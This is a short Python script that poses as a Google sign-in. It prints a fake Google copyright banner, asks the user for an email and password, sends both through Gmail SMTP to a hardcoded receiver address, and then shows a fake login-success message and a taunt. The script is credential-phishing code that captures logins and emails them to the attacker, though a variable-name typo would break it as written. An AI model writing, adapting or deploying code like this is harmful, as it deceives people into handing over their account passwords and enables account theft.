import smtplib
import time
print ("    Google 2019 (C) All rights are reserved.")
email = "gmailonly"
pswd = "gmailpassword"
receive = "receiver@email.com"
message = input("Email: ") + input("Password: ")
s = smtplib.SMTP("smtp.gmail.com", 587)
s.starttls()
s.login(email, pswd)
print (" You logged in successfully {!}")
s.sendmail(email, recieve, message)
print ("[============>] Email sent successfully...")
time.sleep(0.1)
print ("OH GOD. DID I GET HACKED, BY THE TRUTH???!!")
